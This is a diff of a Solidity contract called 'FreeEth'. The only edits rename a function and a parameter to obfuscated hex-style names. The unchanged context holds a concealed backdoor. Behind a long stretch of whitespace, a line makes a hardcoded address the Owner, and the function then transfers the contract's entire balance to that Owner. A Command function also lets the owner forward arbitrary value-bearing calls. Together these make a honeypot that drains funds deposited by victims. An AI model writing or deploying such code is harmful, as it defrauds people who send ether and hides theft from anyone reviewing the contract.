@@ -16,7 +16,7 @@ contract FreeEth
         }
     }
 
-    function _0x5ab369()
+    function _0x4f7dd9()
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
@@ -24,11 +24,11 @@ contract FreeEth
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0xf99786,bytes data)
+    function Command(address _0x3e159c,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0xf99786.call.value(msg.value)(data);
+        _0x3e159c.call.value(msg.value)(data);
     }
 }
